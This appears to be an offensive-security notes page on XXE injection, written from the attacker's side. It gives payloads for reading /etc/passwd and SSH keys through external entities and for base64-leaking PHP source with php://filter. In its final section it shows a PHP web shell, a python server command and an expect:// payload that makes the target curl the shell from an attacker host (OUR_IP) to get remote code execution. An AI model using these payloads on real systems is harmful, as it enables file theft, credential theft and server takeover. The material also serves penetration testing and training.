---
layout: default
title: XXE
permalink: /Web/xxe/
---

# XML External Entity (XXE) Injection
XXE Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions.

## Local File Disclosure
When a web application trusts unfiltered XML data from user input, we may be able to reference an external XML DTD document and define new custom XML entities. Suppose we can define new entities and have them displayed on the web page. In that case, we should also be able to define external entities and make them reference a local file, which, when displayed, should show us the content of that file on the back-end server.

### Identifying
If we intercept an HTTP request and our data is send in an XML format to the web server, then it is a potential target. If the web application uses outdated XML libraries, and it does not apply any filters or sanitization on our XML input. In that case, we may be able to exploit this XML form to read local files. <br>
If we send a request and one element is displayed back to us, we can try to inject into that element. We can add e.g. the following lines after the first line the int XML input (the first line should look something like this: `<?xml version="1.0" encoding="UTF-8"?>`):
```
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
*Note: In this example, the XML input in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the DOCTYPE was already declared in the XML request, we would just add the ENTITY element to it.*

Now, we should have a new XML entity called 'company', which we can reference with `&company;`. So, instead of using e.g. our email in the email element, we can try using `&company;`, and see whether it will be replaced with the value we defined ('Inlane Freight'):

*Note: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.*

### Reading Files
To see if we can define external XML entities, we can add the SYSTEM keyword and define the external reference path after it:
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
This enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an id_rsa SSH key of a specific user, which may grant us access to the back-end server.

*Note: In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.*

### Reading Source Code
This would allow us to perform a Whitebox Penetration Test to unveil more vulnerabilities in the web application, or reveal secret configurations like database passwords or API keys. <br>
If the file we are referencing is not in a proper XML format, it fails to be referenced as an external XML entity, so this one probably fails:
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file://index.php">
]>
```
If a file contains some of XML's special characters (e.g. </>/&), it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format. <br>
However, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format. To do so, instead of using file:// as our reference, we will use PHP's php://filter/ wrapper. With this filter, we can specify the convert.base64-encode encoder as our filter, and then add an input resource (e.g. resource=index.php), as follows:
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
*Note: This trick only works with PHP web applications.*

### Remote Code Execution with XXE
The easiest method would be to look for ssh keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the PHP://expect filter, though this requires the PHP expect module to be installed and enabled. <br>
The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:
```
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
```
```
sudo python3 -m http.server 80
```
Now, we can use the following XML code to execute a curl command that downloads our web shell into the remote server:
```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

 
